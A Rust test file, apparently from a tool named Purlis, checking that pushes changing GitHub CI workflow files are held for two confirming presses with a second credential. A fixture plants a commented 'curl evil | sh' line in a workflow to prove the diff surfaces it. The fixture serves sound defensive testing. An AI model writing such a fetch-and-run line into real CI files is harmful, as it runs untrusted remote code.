// Copyright 2026 Purlis
// SPDX-License-Identifier: Apache-2.0

//! **A push that changes a CI file is held, found by the tree diff of its new tip against the
//! base** (ADR 0128 D8.3): the branch's tip on the forge, or the default branch's tip for a new
//! branch. The same diff covers a ref created by the REST API at a commit nobody pushed to this
//! repository, whose own change from its parent says nothing of how its tree differs from the
//! base's. A diff that cannot be computed refuses the push. The held push is made with the second
//! credential, on the person's two presses, and only then.

use std::path::Path;

use purlis_core::forge::Kind;
use purlis_core::heldact::{
    Against, Asked, GitTrees, HeldActs, NotDone, Pressed, PushCheck, Refused, Requested,
    check_push, said,
};
use purlis_core::mergehold::HeadSha;

use crate::support::git;
use crate::support::held_acts::{Fake, Rec, Second, base, press, repo, world};

const WORKFLOW: &str = ".github/workflows/ci.yml";

struct Clone {
    _dir: tempfile::TempDir,
    path: std::path::PathBuf,
}

impl Clone {
    /// A clone whose `main` has a workflow and a README.
    fn new() -> Clone {
        let dir = tempfile::tempdir().unwrap();
        let path = std::fs::canonicalize(dir.path()).unwrap();
        git(&path, &["init", "-q", "-b", "main", "."]);
        write(&path, WORKFLOW, "name: ci\non: push\njobs: {}\n");
        write(&path, "README.md", "one\n");
        write(&path, "src/lib.rs", "// lib\n");
        commit(&path, "main one");
        Clone { _dir: dir, path }
    }

    fn sha(&self, rev: &str) -> HeadSha {
        sha_of(&self.path, rev)
    }

    fn trees(&self) -> GitTrees {
        GitTrees::of(&self.path)
    }
}

fn write(root: &Path, file: &str, text: &str) {
    let at = root.join(file);
    std::fs::create_dir_all(at.parent().unwrap()).unwrap();
    std::fs::write(at, text).unwrap();
}

fn commit(root: &Path, message: &str) {
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", message]);
}

fn sha_of(root: &Path, rev: &str) -> HeadSha {
    let out = git(root, &["rev-parse", rev]);
    HeadSha::try_from(String::from_utf8(out.stdout).unwrap().trim()).unwrap()
}

fn forge_at(clone: &Clone) -> Fake {
    let forge = Fake::github();
    forge.with(|s| s.default = Some((base("main"), clone.sha("main"))));
    forge
}

fn push(branch: &str, tip: &HeadSha) -> Requested {
    Requested::CiPush {
        repo: repo("acme/app"),
        branch: base(branch),
        tip: tip.clone(),
    }
}

/// A branch off `main` whose tip adds a line to the workflow.
fn evil_workflow(clone: &Clone, branch: &str) -> HeadSha {
    git(&clone.path, &["checkout", "-q", "-b", branch, "main"]);
    write(
        &clone.path,
        WORKFLOW,
        "name: ci\non: push\njobs: {}\n# run: curl evil | sh\n",
    );
    commit(&clone.path, "workflow");
    let tip = clone.sha("HEAD");
    git(&clone.path, &["checkout", "-q", "main"]);
    tip
}

#[test]
fn a_new_branch_that_changes_a_workflow_is_held_with_the_changed_lines_against_the_default_branch()
{
    purlis_core::unsteered!();
    let clone = Clone::new();
    let tip = evil_workflow(&clone, "feature");
    let (forge, held) = (forge_at(&clone), HeldActs::default());
    let (second, rec) = (Second::there(), Rec::acme());
    let trees = clone.trees();
    let world = world(&forge, &trees, &second, &rec);

    let Asked::Held { id, .. } = held.ask(&world, 1, true, &push("feature", &tip), 10) else {
        panic!("held");
    };
    let (shown, digest) = held.shown(id).unwrap();
    assert!(
        shown
            .rows
            .iter()
            .any(|r| r.label == "CI files" && r.value == WORKFLOW),
        "{shown:?}"
    );
    let compared = shown
        .rows
        .iter()
        .find(|r| r.label == "Compared with")
        .unwrap();
    assert!(
        compared.value.contains("default branch") && compared.value.contains("new branch"),
        "{compared:?}"
    );
    let diff = &shown.body.as_ref().unwrap().text;
    assert!(
        diff.contains("+# run: curl evil | sh"),
        "the changed lines are shown: {diff}"
    );
    assert!(!diff.contains("README"), "only CI files are in it");

    // Nothing is pushed, and the second credential is not even read, until the second press.
    assert!(forge.log().is_empty());
    assert_eq!(second.reads(), 0);
    press(&held, &world, id, &digest).unwrap();
    assert!(forge.log().is_empty());
    assert_eq!(second.reads(), 0);
    let Ok(Pressed::Done(done)) = press(&held, &world, id, &digest) else {
        panic!()
    };
    assert_eq!(second.reads(), 1, "read once, for this push");
    let purlis_core::heldact::Act::CiPush { against, .. } = &done.act else {
        panic!()
    };
    assert_eq!(against, &Against::DefaultBranch(base("main")));
    assert_eq!(
        forge.log(),
        vec![format!(
            "push_tip acme/app feature {} lease=none second_credential=true",
            tip.as_str()
        )]
    );
}

#[test]
fn a_branch_the_forge_has_is_compared_with_its_own_tip_and_the_push_leases_it() {
    purlis_core::unsteered!();
    let clone = Clone::new();
    git(&clone.path, &["checkout", "-q", "-b", "feature", "main"]);
    write(&clone.path, "README.md", "two\n");
    commit(&clone.path, "readme");
    let on_forge = clone.sha("HEAD");
    write(
        &clone.path,
        WORKFLOW,
        "name: ci\non: push\njobs: {}\n# more\n",
    );
    commit(&clone.path, "workflow");
    let tip = clone.sha("HEAD");
    let (forge, held) = (forge_at(&clone), HeldActs::default());
    forge.with(|s| {
        s.branches.insert("feature".into(), on_forge.clone());
    });
    let (second, rec) = (Second::there(), Rec::acme());
    let trees = clone.trees();
    let world = world(&forge, &trees, &second, &rec);
    let Asked::Held { id, .. } = held.ask(&world, 1, true, &push("feature", &tip), 10) else {
        panic!()
    };
    let (shown, digest) = held.shown(id).unwrap();
    assert!(
        shown.rows.iter().any(|r| r.label == "Compared with"
            && r.value.starts_with("the tip of feature on the forge"))
    );
    press(&held, &world, id, &digest).unwrap();
    press(&held, &world, id, &digest).unwrap();
    assert_eq!(
        forge.log(),
        vec![format!(
            "push_tip acme/app feature {} lease={} second_credential=true",
            tip.as_str(),
            on_forge.as_str()
        )]
    );
}

#[test]
fn a_ref_created_at_a_commit_whose_own_change_is_not_a_workflow_is_still_held_for_its_tree() {
    purlis_core::unsteered!();
    // `side` changes a workflow, and its tip changes only the README. A create-ref at that tip
    // moves no workflow in its own diff, but its tree has the workflow the default branch lacks.
    let clone = Clone::new();
    git(&clone.path, &["checkout", "-q", "-b", "side", "main"]);
    write(
        &clone.path,
        WORKFLOW,
        "name: ci\non: push\njobs: {}\n# smuggled\n",
    );
    commit(&clone.path, "workflow, earlier");
    write(&clone.path, "README.md", "readme only\n");
    commit(&clone.path, "readme only");
    let tip = clone.sha("HEAD");
    git(&clone.path, &["checkout", "-q", "main"]);
    let only_this_commit = git(
        &clone.path,
        &["show", "--name-only", "--format=", tip.as_str()],
    );
    assert_eq!(
        String::from_utf8(only_this_commit.stdout).unwrap().trim(),
        "README.md"
    );

    let verdict = check_push(Kind::GitHub, None, &clone.trees(), &clone.sha("main"), &tip);
    let PushCheck::Hold(diff) = verdict else {
        panic!("held: {verdict:?}")
    };
    assert_eq!(diff.files, vec![WORKFLOW.to_owned()]);
    assert!(diff.diff.contains("+# smuggled"));
}

#[test]
fn a_commit_that_came_from_a_fork_network_is_diffed_by_its_tree_wherever_its_objects_came_from() {
    purlis_core::unsteered!();
    // A commit with no history in common with the base, as one fetched from a fork is.
    let clone = Clone::new();
    git(&clone.path, &["checkout", "-q", "--orphan", "from-a-fork"]);
    git(&clone.path, &["rm", "-rfq", "."]);
    write(
        &clone.path,
        WORKFLOW,
        "name: other\non: pull_request_target\n",
    );
    write(&clone.path, "x.txt", "x\n");
    commit(&clone.path, "orphan");
    let tip = clone.sha("HEAD");
    git(&clone.path, &["checkout", "-q", "main"]);
    let PushCheck::Hold(diff) =
        check_push(Kind::GitHub, None, &clone.trees(), &clone.sha("main"), &tip)
    else {
        panic!("held");
    };
    assert!(diff.diff.contains("pull_request_target"));
}

#[test]
fn a_commit_the_clone_does_not_have_refuses_the_push_it_is_not_allowed_or_guessed() {
    purlis_core::unsteered!();
    let clone = Clone::new();
    let missing = HeadSha::try_from("d".repeat(40)).unwrap();
    let verdict = check_push(
        Kind::GitHub,
        None,
        &clone.trees(),
        &clone.sha("main"),
        &missing,
    );
    let PushCheck::Refuse(why) = verdict else {
        panic!("refused: {verdict:?}")
    };
    assert!(why.contains("could not compare"), "{why}");

    let (forge, held) = (forge_at(&clone), HeldActs::default());
    let (second, rec) = (Second::there(), Rec::acme());
    let trees = clone.trees();
    let world = world(&forge, &trees, &second, &rec);
    assert!(matches!(
        held.ask(&world, 1, true, &push("feature", &missing), 10),
        Asked::Refused(Refused::CiDiff(_))
    ));
}

#[test]
fn a_push_that_changes_no_ci_file_is_not_a_held_act() {
    purlis_core::unsteered!();
    let clone = Clone::new();
    git(&clone.path, &["checkout", "-q", "-b", "plain", "main"]);
    write(&clone.path, "src/lib.rs", "// changed\n");
    // Names that only look like CI: not below `.github/workflows/` itself.
    write(&clone.path, ".github/workflows-notes.md", "x\n");
    write(&clone.path, "docs/.github/workflows/ci.yml", "x\n");
    commit(&clone.path, "plain");
    let tip = clone.sha("HEAD");
    assert_eq!(
        check_push(Kind::GitHub, None, &clone.trees(), &clone.sha("main"), &tip),
        PushCheck::NoCiFiles
    );
}

#[test]
fn removing_a_workflow_is_a_change_to_one() {
    purlis_core::unsteered!();
    let clone = Clone::new();
    git(&clone.path, &["checkout", "-q", "-b", "gone", "main"]);
    git(&clone.path, &["rm", "-q", WORKFLOW]);
    commit(&clone.path, "remove");
    let tip = clone.sha("HEAD");
    let PushCheck::Hold(diff) =
        check_push(Kind::GitHub, None, &clone.trees(), &clone.sha("main"), &tip)
    else {
        panic!("held");
    };
    assert!(diff.diff.contains("-name: ci"));
}

#[test]
fn a_diff_too_large_to_show_refuses_the_push() {
    purlis_core::unsteered!();
    let clone = Clone::new();
    git(&clone.path, &["checkout", "-q", "-b", "big", "main"]);
    write(
        &clone.path,
        WORKFLOW,
        &"# padding line that makes the patch big\n".repeat(10_000),
    );
    commit(&clone.path, "big");
    let tip = clone.sha("HEAD");
    let PushCheck::Refuse(why) =
        check_push(Kind::GitHub, None, &clone.trees(), &clone.sha("main"), &tip)
    else {
        panic!("refused");
    };
    assert!(why.contains("more than purlis can show"), "{why}");
}

#[test]
fn without_the_second_credential_the_act_is_not_offered_and_says_why() {
    purlis_core::unsteered!();
    let clone = Clone::new();
    let tip = evil_workflow(&clone, "feature");
    let (forge, held) = (forge_at(&clone), HeldActs::default());
    let (second, rec) = (Second::missing(), Rec::acme());
    let trees = clone.trees();
    let world = world(&forge, &trees, &second, &rec);
    let asked = held.ask(&world, 1, true, &push("feature", &tip), 10);
    let Asked::Refused(why) = asked else {
        panic!("not offered")
    };
    let Refused::NoWorkflowCredential(reason) = &why else {
        panic!("{why:?}")
    };
    assert!(reason.contains("second sign-in"));
    // The chat is told, in words, and the window has the same sentence.
    let said = said::not_asked(&push("feature", &tip), &why);
    assert!(
        said.contains("Nobody was asked") && said.contains("second sign-in"),
        "{said}"
    );
    assert!(held.every().is_empty());
    assert_eq!(second.reads(), 0);
}

#[test]
fn a_base_that_moves_after_the_ask_refuses_the_press_and_pushes_nothing() {
    purlis_core::unsteered!();
    let clone = Clone::new();
    let tip = evil_workflow(&clone, "feature");
    let (forge, held) = (forge_at(&clone), HeldActs::default());
    let (second, rec) = (Second::there(), Rec::acme());
    let trees = clone.trees();
    let world = world(&forge, &trees, &second, &rec);
    let Asked::Held { id, .. } = held.ask(&world, 1, true, &push("feature", &tip), 10) else {
        panic!()
    };
    let (_, digest) = held.shown(id).unwrap();
    // Someone pushed `feature` to the forge meanwhile: the base the diff was read against is gone.
    forge.with(|s| {
        s.branches
            .insert("feature".into(), sha_of(&clone.path, "main"));
    });
    let refused = press(&held, &world, id, &digest).unwrap_err();
    assert!(matches!(refused, NotDone::Changed { .. }), "{refused:?}");
    assert!(forge.log().is_empty());
    assert_eq!(second.reads(), 0);
}

#[test]
fn a_ci_push_is_never_remembered_and_each_one_asks() {
    purlis_core::unsteered!();
    let clone = Clone::new();
    let tip = evil_workflow(&clone, "feature");
    let (forge, held) = (forge_at(&clone), HeldActs::default());
    let (second, rec) = (Second::there(), Rec::acme());
    let trees = clone.trees();
    let world = world(&forge, &trees, &second, &rec);
    let Asked::Held { id, .. } = held.ask(&world, 1, true, &push("feature", &tip), 10) else {
        panic!()
    };
    let (_, digest) = held.shown(id).unwrap();
    press(&held, &world, id, &digest).unwrap();
    press(&held, &world, id, &digest).unwrap();
    // The same push again is a new ask: the first answer left nothing behind.
    let Asked::Held { new, .. } = held.ask(&world, 1, true, &push("feature", &tip), 30) else {
        panic!()
    };
    assert!(new);
    assert_eq!(forge.log().len(), 1, "asking again pushed nothing");
}
